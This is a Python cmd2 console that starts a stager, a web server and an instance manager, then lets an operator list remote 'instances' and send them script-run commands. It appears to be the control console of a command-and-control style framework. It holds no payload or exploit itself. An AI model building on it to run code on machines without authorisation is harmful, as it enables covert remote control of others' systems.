import logging
from typing import Optional
import cmd2
import cmd2.argparse_custom
import sys

import stager
from instance import Instance
from instance_manager import InstanceManager
import web_server
from pyterpreter import Message

logger = logging.Logger('APP')


class Application(cmd2.Cmd):
    def __init__(self):
        super().__init__()
        self.debug = True
        self.instance: Optional[Instance] = None
        self.add_settable(cmd2.Settable('instance', InstanceManager.get_by_uid, 'Selected instance id', choices_function=InstanceManager.get_uids))

    def _check_active_instance_selected(self) -> bool:
        if self.instance is not None and self.instance.active is True:
            return True
        else:
            logger.info(f'Instance {self.instance} is not active')
            return False

    do_show_parser = cmd2.Cmd2ArgumentParser()
    do_show_parser.add_argument('name', choices=['instances'])

    @cmd2.with_argparser(do_show_parser)
    def do_show(self, args):
        if args.name == 'instances':
            self.poutput('\n'.join(str(instance) for instance in InstanceManager.get_all()))

    def my_choices_provider(self):
        return ['1', '2']

    do_run_script_parser = cmd2.Cmd2ArgumentParser()
    do_run_script_parser.add_argument('name', help='Name of script', choices_provider=my_choices_provider)

    @cmd2.with_argparser(do_run_script_parser)
    def do_run_script(self, args):
        if self._check_active_instance_selected():
            InstanceManager.messages_to_send.put((self.instance, Message(Message.RUN_SCRIPT, args.name)))
            logger.info(f'Running script {args.name}')


def main():
    app = Application()
    logging.set_output_func(app.poutput)
    stager.initialise()
    InstanceManager.start_worker()
    web_server.start()
    sys.exit(app.cmdloop())


if __name__ == '__main__':
    main()
